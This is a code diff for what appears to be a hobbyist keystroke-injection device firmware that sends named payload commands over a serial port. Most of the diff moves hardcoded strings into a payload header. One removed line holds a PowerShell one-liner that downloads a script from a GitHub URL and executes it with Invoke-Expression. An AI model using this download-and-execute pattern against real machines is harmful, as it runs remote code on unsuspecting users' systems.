@@ -1,4 +1,5 @@
 #include <serials.h>
+#include <payloadsList.h>
 // #include <oled.h>
 
 HardwareSerial pinSerial(1); // Use UART1 (you can pick another depending on your setup)
@@ -25,7 +26,7 @@ void SERIALS::sdPayload() {
     // oled.printlnString("Sending Command:");
     // oled.printlnString("sdPayload");
     // pinSerial.println("sdPayload");
-    pinSerial.println("payload");
+    pinSerial.println(payloadsList.CONST_SDCARD);
 }
 void SERIALS::pullScript() {
     Serial.println();
@@ -33,15 +34,15 @@ void SERIALS::pullScript() {
     // oled.clear();
     // oled.printlnString("Sending Command:");
     // oled.printlnString("pullScript");
-    pinSerial.println("pullScript");
+    pinSerial.println(payloadsList.CONST_PULLSCRIPT);
 }
 void SERIALS::pullScriptExit() {
     Serial.println();
-    Serial.println("Sending Command: pullScriptExit");
+    Serial.println("Sending Command: pullScript");
     // oled.clear();
     // oled.printlnString("Sending Command:");
     // oled.printlnString("pullScript");
-    pinSerial.println("$PAYLOAD - PULLSCRIPTEXIT$xa$ScriptFromGitHub = Invoke-WebRequest https://raw.githubusercontent.com/mr-foxi/dummyPayload/refs/heads/main/dummyPayload.ps1; Invoke-Expression $($ScriptFromGitHub.Content); exit");
+    pinSerial.println(payloadsList.CONST_PULLSCRIPTEXIT);
 }
 
 String SERIALS::pinRead() {
